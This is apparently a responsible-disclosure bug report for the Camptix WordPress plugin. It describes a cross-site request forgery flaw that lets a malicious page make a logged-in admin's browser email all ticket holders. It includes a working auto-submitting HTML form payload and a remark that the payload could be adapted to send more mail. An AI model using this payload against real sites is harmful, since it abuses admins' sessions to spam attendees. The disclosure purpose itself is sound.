Summary:

Ian,
This is my first stab at submitting a bug, and I'm not even sure it is one. Here's what I found.

If an admin of a site using Camptix who is logged into the admin screen visits a malicious site which has access to a valid wpnonce value could send a large volume of spam to all ticket holders.

POC: 
<body onload="document.getElementById('s').submit();">
<form method=post id=s action="http://xxx/wp-admin/edit.php?post_type=tix_ticket&page=camptix_tools&tix_summarize=1&tix_section=notify&tix_notify_attendees=1">
	<input type=hidden name="tix-notify-segment-query" value='[{"field":"ticket","op":"is not","value":"1"}]'>
	<input type=hidden name="tix-notify-segment-match" value="OR">
<input type=hidden name="tix_notify_subject" value="camptix likes viagara">
<input type=hidden name="tix_notify_body" value="send scary messages about viagra">
<input type=hidden name="tix_notify_attendees" value="1">
<input type=hidden name="tix_notify_submit " value="Send E-mails">
<input type=hidden name="_wpnonce" value="122536321b">
<input type=hidden name="_wp_http_referer" value="/wp-admin/edit.php?post_type=tix_ticket&page=camptix_tools&tix_summarize=1&tix_section=notify&tix_notify_attendees=1">
	<input type=submit >	
</form>
</body>

I'm not an expert at wpnonce values, but the documentation of Wordpress indicates that you shouldn't rely on it for security, and this article claims they can be generated easily.

The POC only sends only email to each recipient, but you could adapt it to attempt to send more. Depending on how many attendees, the script could send zero or thousands of emails.

I'm eager to hear back, and I'm eager to hear how I could make this report more helpful. :)
